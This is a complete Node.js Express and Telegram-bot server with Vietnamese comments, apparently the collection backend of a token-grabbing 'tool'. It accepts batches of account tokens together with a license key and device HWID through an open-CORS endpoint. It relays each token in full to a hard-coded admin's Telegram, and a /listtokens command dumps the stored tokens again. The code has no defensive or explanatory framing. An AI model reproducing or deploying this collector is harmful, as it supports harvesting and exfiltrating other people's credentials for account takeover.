const express = require('express');
const cors = require('cors'); // Đảm bảo đã npm install cors
const TelegramBot = require('node-telegram-bot-api');

const app = express();

// 1. CỰC KỲ QUAN TRỌNG: Cho phép Web gửi dữ liệu sang Server mà không bị chặn
app.use(cors()); 

// 2. CỰC KỲ QUAN TRỌNG: Cho phép Server đọc dữ liệu JSON gửi từ index.html
app.use(express.json()); 

const TELEGRAM_TOKEN = "BOT_TOKEN_CỦA_BẠN";
const ADMIN_ID = 8377928865; // Thay bằng ID Telegram Admin của bạn
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// Bộ nhớ tạm lưu Token
let globalTokens = [];

// API Nhận và Lưu Token từ Web
app.post('/api/save-tokens', async (req, res) => {
    try {
        const { key, deviceId, tokens } = req.body;

        // Kiểm tra nếu dữ liệu token gửi lên bị rỗng
        if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
            return res.status(400).json({ success: false, message: "Không tìm thấy token nào trong yêu cầu!" });
        }

        // Lọc bỏ token rỗng
        const validTokens = tokens.map(t => t.trim()).filter(t => t !== "");
        
        if (validTokens.length === 0) {
            return res.status(400).json({ success: false, message: "Danh sách Token rỗng!" });
        }

        // Lưu vào bộ nhớ tạm của Server
        globalTokens = validTokens;

        // GỬI THÔNG BÁO TOKEN TRỰC TIẾP VỀ TELEGRAM ADMIN
        let msg = `📥 **NHẬN TOKEN MỚI TỪ TOOL**\n`;
        msg += `🔑 Key: \`${key || 'Không có'}\`\n`;
        msg += `📱 HWID: \`${deviceId || 'Không có'}\`\n`;
        msg += `📊 Số lượng: **${validTokens.length} Token**\n\n`;
        msg += `📋 **Danh sách Token:**\n`;
        
        validTokens.forEach((tk, idx) => {
            msg += `${idx + 1}. \`${tk}\`\n`;
        });

        await bot.sendMessage(ADMIN_ID, msg, { parse_mode: 'Markdown' });

        return res.json({ success: true, message: "Đã lưu và gửi Token về Bot thành công!" });

    } catch (error) {
        console.error("Lỗi xử lý /api/save-tokens:", error);
        return res.status(500).json({ success: false, message: "Lỗi Server nội bộ!" });
    }
});

// Lệnh kiểm tra danh sách Token trên Telegram Bot
bot.onText(/\/listtokens/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;

    if (globalTokens.length === 0) {
        return bot.sendMessage(ADMIN_ID, "⚠️ Hiện chưa có Token nào trong hệ thống (Hoặc Server vừa bị reset).");
    }

    let text = `📋 **DANH SÁCH TOKEN HIỆN CÓ (${globalTokens.length}):**\n\n`;
    globalTokens.forEach((tk, i) => {
        text += `${i + 1}. \`${tk}\`\n`;
    });

    bot.sendMessage(ADMIN_ID, text, { parse_mode: 'Markdown' });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server đang chạy...");
});
